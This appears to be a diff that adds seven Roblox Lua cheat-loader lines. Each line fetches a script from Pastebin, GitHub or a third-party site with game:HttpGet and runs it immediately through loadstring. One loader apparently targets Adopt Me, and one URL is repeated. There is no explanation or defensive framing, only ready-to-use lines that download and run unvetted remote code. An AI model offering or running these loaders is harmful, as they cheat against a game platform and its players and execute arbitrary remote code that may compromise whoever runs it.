@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/Z3iAXASr", true))();
+loadstring(game:HttpGet("https://bloxhub.xyz/script/loader"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxiYT/Diamond/main/AdoptMe"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JusticeValley/Antarctic-Hub/main/New.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/Z3iAXASr",true))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua"),true))();
